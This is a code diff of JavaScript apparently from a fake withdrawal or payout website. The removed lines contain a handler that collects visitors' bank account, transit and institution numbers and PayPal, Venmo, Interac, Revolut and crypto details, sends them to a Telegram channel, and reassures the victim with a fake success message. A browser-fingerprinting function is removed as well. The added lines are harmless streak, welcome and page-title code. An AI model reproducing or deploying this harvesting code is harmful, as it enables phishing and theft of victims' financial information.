-            selectedRegion = "UK";
-            if (preference === "British Bank Transfer") {
-                exactTransferMethodName = savedData.britishBank || "British Bank Transfer";
-            }
+        if(lastVisit === new Date(Date.now() - 86400000).toDateString()){
+            streak += 1; // consecutive day
+        } else {
+            streak = 1; // reset streak
         }
+        localStorage.setItem("streak", streak);
+        localStorage.setItem("lastVisit", today);
     }
 
-    // Explicit keys for Page 1 to safely pull instantly
-    localStorage.setItem("av_selected_region", selectedRegion);
-    localStorage.setItem("av_selected_method_title", exactTransferMethodName);
-
-    // Save master configuration block
-    localStorage.setItem("section3Data", JSON.stringify(savedData));
+    document.getElementById("streakCount").innerText = streak;
 }
 
+/* ---------- Welcome ---------- */
 
+window.onload = () => {
 
+notify('Get assistance or clarification here.');
 
+};
 
-/* --------------------------
-MAIN BUTTON HANDLER
--------------------------- */
-document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
-
-  // 1. FIRST check validation. If incomplete, stop right here and output message.
-  const validation = validateCurrentPreference();
-  if (!validation.valid) {
-    showNotification(validation.message, 5000);
-    return; 
-  }
-
-  // 2. Show the verification progress message
-  showNotification("Verifying payout information...", 2500);
-
-  const data = {
-    preference,
-    acuAccount: document.getElementById("acuAccount")?.value.trim(),
-    cryptoName: document.getElementById("cryptoName")?.value.trim(),
-    paypal: document.getElementById("paypalInput")?.value.trim(),
-    paypalName: document.getElementById("paypalName")?.value.trim(),
-    interac: document.getElementById("interacInput")?.value.trim(),
-    interacName: document.getElementById("interacName")?.value.trim(),
-    canadianBank: document.getElementById("canadianBankSelect")?.value.trim(),
-    accountName: document.getElementById("accountName")?.value.trim(),
-    transitNumber: document.getElementById("transitNumber")?.value.trim(),
-    institutionNumber: document.getElementById("institutionNumber")?.value.trim(),
-    accountNumber: document.getElementById("accountNumber")?.value.trim(),
-
-    // US collection mapping
-    venmo: document.getElementById("venmoInput")?.value.trim(),
-    venmoName: document.getElementById("venmoName")?.value.trim(),
-    americanBank: document.getElementById("americanBankSelect")?.value.trim(),
-    accountNameUs: document.getElementById("accountName-us")?.value.trim(),
-    transitNumberUs: document.getElementById("transitNumber-us")?.value.trim(),
-    accountNumberUs: document.getElementById("accountNumber-us")?.value.trim(),
-    paypalUs: document.getElementById("paypalInput-us")?.value.trim(),
-    paypalNameUs: document.getElementById("paypalName-us")?.value.trim(),
-    acuAccountUs: document.getElementById("acuAccount-us")?.value.trim(),
-    cryptoNameUs: document.getElementById("cryptoName-us")?.value.trim(),
-
-    // UK collection mapping
-    revolut: document.getElementById("revolutInput")?.value.trim(),
-    revolutName: document.getElementById("revolutName")?.value.trim(),
-    britishBank: document.getElementById("britishBankSelect")?.value.trim(),
-    accountNameUk: document.getElementById("accountName-uk")?.value.trim(),
-    transitNumberUk: document.getElementById("transitNumber-uk")?.value.trim(),
-    accountNumberUk: document.getElementById("accountNumber-uk")?.value.trim(),
-    paypalUk: document.getElementById("paypalInput-uk")?.value.trim(),
-    paypalNameUk: document.getElementById("paypalName-uk")?.value.trim(),
-    acuAccountUk: document.getElementById("acuAccount-uk")?.value.trim(),
-    cryptoNameUk: document.getElementById("cryptoName-uk")?.value.trim()
-  };
-
-  localStorage.setItem("section3Data", JSON.stringify(data));
-
-  try {
-    // 3. Exact original Telegram request execution
-    await sendToTelegram(data);
-    showNotification("Payout method linked successfully", 3000);
-
-    // Brief delay to allow the notification to display before redirecting
-    setTimeout(() => {
-      window.location.href = "https://membership.avalonflow.site/withdraw";
-    }, 1500);
-
-  } catch (err) {
-    console.error("Telegram send failed:", err);
-    showNotification("Failed to link payout method. Please try again", 5000);
-  }
-});
-
-
-
-
-/* --------------------------
-FINGERPRINT
--------------------------- */
-
-function getFingerprint() {
-  return btoa(
-    navigator.userAgent +
-    screen.width + screen.height +
-    navigator.language
-  );
-}
 
 
 /* ---------- Auto-Logout After 15 Minutes of Inactivity ---------- */
@@ -3086,15 +1223,14 @@ function resetLogoutTimer() {
 ["mousemove", "keydown", "scroll", "click", "touchstart"].forEach(event => {
     window.addEventListener(event, resetLogoutTimer, { passive: true });
 });
-});
-// Remove the listener that fires immediately
+
+
 window.addEventListener("load", () => {
-    // Fire this only when the login form is fully rendered
+
     window.parent.postMessage({
         type: "UPDATE_TITLE",
-        title: "Preferred Wallet" 
+        title: "Contact Us" 
     }, "*");
-
 // 1. Grab the user context from the current URL right away
 const urlParams = new URLSearchParams(window.location.search);
 const userParam = urlParams.get('user');
@@ -3102,8 +1238,8 @@ const userParam = urlParams.get('user');
 // 2. Build the destination path dynamically
 
 const destinationPath = userParam 
-    ? `/withdrawal?user=${encodeURIComponent(userParam)}` 
-    : '/withdrawal';
+    ? `/w?user=${encodeURIComponent(userParam)}` 
+    : '/w';
 
 // 3. Trigger your existing update mechanism with the updated path
 window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
